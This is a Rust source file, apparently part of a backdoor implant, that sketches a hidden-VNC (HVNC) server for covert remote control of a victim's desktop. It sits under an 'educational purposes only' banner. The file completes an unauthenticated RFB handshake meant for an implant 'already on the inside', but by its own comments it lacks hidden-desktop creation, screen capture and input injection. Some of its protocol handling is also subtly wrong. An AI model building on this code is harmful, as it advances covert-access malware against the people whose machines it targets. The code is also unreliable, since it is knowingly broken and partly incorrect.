/*
** *********************************************************************
** *********************************************************************
**
**                              DISCLAIMER
**       For educational purposes only. 2026 All rights reversed.
**
** *********************************************************************
** *********************************************************************
*/

// backdoor/hvnc.rs — Hidden VNC server (name vs behaviour).
//
// Comments describe CreateDesktop + capture + input injection.
// Code: bind 127.0.0.1, RFB 3.8 handshake, empty framebuffer updates.
//
// BROKEN:
//   - No CreateDesktop / hidden desktop.
//   - No screen capture; FramebufferUpdateRequest gets an invalid empty update.
//   - Key/pointer events are read and discarded (no inject).
//   - Localhost only; operator cannot connect without another tunnel.
//   - stop() is never called; start() blocks the HVNC thread forever.

use log::{info, error};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use tokio::net::TcpListener;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

pub struct HvncServer {
    port:    u16,
    running: Arc<AtomicBool>,
}

impl HvncServer {
    pub fn new(port: u16) -> Self {
        HvncServer {
            port,
            running: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Start the HVNC listener.  Blocks until the server is stopped.
    /// In practice `running` stays true; nothing calls stop().
    pub fn start(&mut self) {
        self.running.store(true, Ordering::Relaxed);
        info!("HVNC starting on port {}", self.port);

        let port    = self.port;
        let running = Arc::clone(&self.running);

        // Spawn a dedicated Tokio runtime for the async listener so we don't
        // block the calling thread's runtime.
        let rt = match tokio::runtime::Builder::new_current_thread()
            .enable_all()
            .build()
        {
            Ok(r)  => r,
            Err(e) => { error!("HVNC runtime failed: {}", e); return; }
        };

        rt.block_on(async move {
            let addr = format!("127.0.0.1:{}", port);
            let listener = match TcpListener::bind(&addr).await {
                Ok(l)  => l,
                Err(e) => { error!("HVNC bind failed: {}", e); return; }
            };
            info!("HVNC listening on {}", addr);

            while running.load(Ordering::Relaxed) {
                match listener.accept().await {
                    Ok((stream, peer)) => {
                        info!("HVNC connection from {}", peer);
                        tokio::spawn(handle_vnc_client(stream));
                    }
                    Err(e) => {
                        error!("HVNC accept error: {}", e);
                        break;
                    }
                }
            }
        });
    }

    pub fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
        info!("HVNC stopped.");
    }
}

// ── RFB (VNC) protocol skeleton ───────────────────────────────────────────────

/// Handshake then a message loop that does not serve a real desktop.
async fn handle_vnc_client(mut stream: tokio::net::TcpStream) {
    // RFB 3.8 handshake.
    if stream.write_all(b"RFB 003.008\n").await.is_err() { return; }
    let mut ver_buf = [0u8; 12];
    if stream.read_exact(&mut ver_buf).await.is_err() { return; }

    // Security type: 1 = None (no auth — implant is already on the inside).
    if stream.write_all(&[0x01, 0x01]).await.is_err() { return; }
    let mut sec_buf = [0u8; 1];
    if stream.read_exact(&mut sec_buf).await.is_err() { return; }

    // Security result: OK.
    if stream.write_all(&[0x00, 0x00, 0x00, 0x00]).await.is_err() { return; }

    // ServerInit: width=1920, height=1080, pixel format, name.
    let server_init: &[u8] = &[
        0x07, 0x80,         // width  1920
        0x04, 0x38,         // height 1080
        // Pixel format (32bpp, 24 depth, little-endian, true-colour)
        0x20, 0x18, 0x00, 0x01,
        0x00, 0xFF, 0x00, 0xFF, 0x00, 0xFF,
        0x10, 0x08, 0x00,
        0x00, 0x00, 0x00,   // padding
        // Name length + "HVNC"
        0x00, 0x00, 0x00, 0x04,
        b'H', b'V', b'N', b'C',
    ];
    if stream.write_all(server_init).await.is_err() { return; }

    // Main message loop.
    let mut msg = [0u8; 1];
    loop {
        if stream.read_exact(&mut msg).await.is_err() { break; }
        match msg[0] {
            2 => { /* SetEncodings — skip */ let mut b = [0u8; 3]; let _ = stream.read_exact(&mut b).await; }
            3 => {
                // FramebufferUpdateRequest — send empty update.
                let mut b = [0u8; 9]; let _ = stream.read_exact(&mut b).await;
                // A real impl would capture the hidden desktop here.
                // BROKEN: this 8-byte blob is not a valid FramebufferUpdate.
                let update = &[0x00u8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
                if stream.write_all(update).await.is_err() { break; }
            }
            4 | 5 | 6 => {
                // KeyEvent / PointerEvent / ClientCutText — inject into hidden desktop.
                // BROKEN: skipped; no inject.
                let skip = match msg[0] { 4 => 7, 5 => 5, 6 => 7, _ => 0 };
                let mut b = vec![0u8; skip];
                let _ = stream.read_exact(&mut b).await;
            }
            _ => break,
        }
    }
}
